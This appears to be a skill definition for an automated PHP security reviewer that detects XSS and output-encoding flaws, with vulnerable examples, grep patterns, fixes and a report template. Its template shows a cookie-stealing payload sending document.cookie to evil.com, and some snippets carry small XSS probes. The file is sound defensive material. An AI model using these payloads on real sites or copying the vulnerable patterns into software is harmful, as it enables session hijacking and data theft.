---
name: acc-check-output-encoding
description: Analyzes PHP code for output encoding issues. Detects XSS vulnerabilities, missing HTML encoding, raw output, template injection risks.
---

# Output Encoding Security Check

Analyze PHP code for XSS and output encoding vulnerabilities.

## Detection Patterns

### 1. Missing HTML Encoding

```php
// CRITICAL: Direct echo of user input
echo $_GET['name'];
echo $user->getBio();

// CRITICAL: In HTML attribute
<input value="<?= $value ?>">
<a href="<?= $url ?>">

// CRITICAL: In JavaScript context
<script>var name = "<?= $name ?>";</script>
```

### 2. Raw Template Output

```php
// CRITICAL: Blade raw output
{!! $userContent !!}
{!! $request->input('message') !!}

// CRITICAL: Twig raw filter
{{ content|raw }}
{% autoescape false %}{{ content }}{% endautoescape %}

// VULNERABLE: PHP in templates
<?php echo $title; ?>
```

### 3. URL Encoding Issues

```php
// VULNERABLE: JavaScript URL
$url = "javascript:" . $_GET['code'];
<a href="<?= $url ?>">Click</a>

// VULNERABLE: Data URL
<img src="data:image/svg+xml,<?= $content ?>">

// VULNERABLE: Missing URL encoding
<a href="/search?q=<?= $query ?>">
```

### 4. JSON/JavaScript Context

```php
// VULNERABLE: JSON in HTML
<script>
var config = <?= json_encode($userConfig) ?>;
</script>

// CRITICAL: String in JS without escaping
<script>
var name = "<?= $name ?>"; // XSS via ";</script><script>alert(1)
</script>

// CORRECT:
<script>
var config = <?= json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP) ?>;
</script>
```

### 5. CSS Context Injection

```php
// VULNERABLE: User input in style
<div style="background: <?= $color ?>">

// VULNERABLE: CSS injection
<style>
.user { color: <?= $userColor ?>; }
</style>

// ATTACK: expression(alert(1)) in IE, url("javascript:")
```

### 6. Header Injection

```php
// VULNERABLE: CRLF injection
header("Location: " . $_GET['redirect']);

// VULNERABLE: In Set-Cookie
setcookie('session', $value); // If $value has newlines

// VULNERABLE: Email header
mail($to, "Subject: $subject", $body); // Subject from user
```

### 7. Content-Type Mismatch

```php
// VULNERABLE: JSON without proper content type
echo json_encode($data); // May be interpreted as HTML

// CORRECT:
header('Content-Type: application/json');
echo json_encode($data);
```

### 8. SVG/XML Injection

```php
// VULNERABLE: User input in SVG
$svg = "<svg><text><?= $name ?></text></svg>";

// VULNERABLE: XML injection
$xml = "<user><name>$name</name></user>";

// ATTACK: <![CDATA[<script>alert(1)</script>]]>
```

## Grep Patterns

```bash
# Direct echo of variables
Grep: "echo\s+\\\$_(GET|POST|REQUEST)" --glob "**/*.php"
Grep: 'echo\s+\$\w+\s*;' --glob "**/*.php"

# Blade raw output
Grep: "\{!!\s*\\\$" --glob "**/*.blade.php"

# Twig raw filter
Grep: "\|raw\s*\}" --glob "**/*.twig"

# JavaScript context
Grep: '<script[^>]*>.*\$\w+' --glob "**/*.php"

# In HTML attributes
Grep: '(href|src|value|style)=["'\''].*<\?=' --glob "**/*.php"
```

## Severity Classification

| Pattern | Severity |
|---------|----------|
| Direct echo of user input | 🔴 Critical |
| JavaScript context injection | 🔴 Critical |
| Raw template output | 🔴 Critical |
| Header injection | 🟠 Major |
| Missing JSON content-type | 🟡 Minor |

## Encoding Functions

### HTML Context

```php
// PHP
echo htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// Blade (default)
{{ $value }}

// Twig (default)
{{ value }}
```

### URL Context

```php
<a href="/search?q=<?= urlencode($query) ?>">
<a href="<?= htmlspecialchars($url, ENT_QUOTES) ?>">
```

### JavaScript Context

```php
<script>
var data = <?= json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP) ?>;
</script>
```

### CSS Context

```php
// Whitelist approach
$allowedColors = ['red', 'blue', 'green'];
$color = in_array($input, $allowedColors) ? $input : 'black';
```

## Output Format

```markdown
### XSS Vulnerability: [Description]

**Severity:** 🔴 Critical
**Location:** `file.php:line`
**CWE:** CWE-79 (Cross-site Scripting)

**Issue:**
User input is output without proper encoding.

**Attack Vector:**
Attacker can inject: `<script>document.location='https://evil.com/?c='+document.cookie</script>`

**Code:**
```php
// Vulnerable code
```

**Fix:**
```php
// With proper encoding
```
```
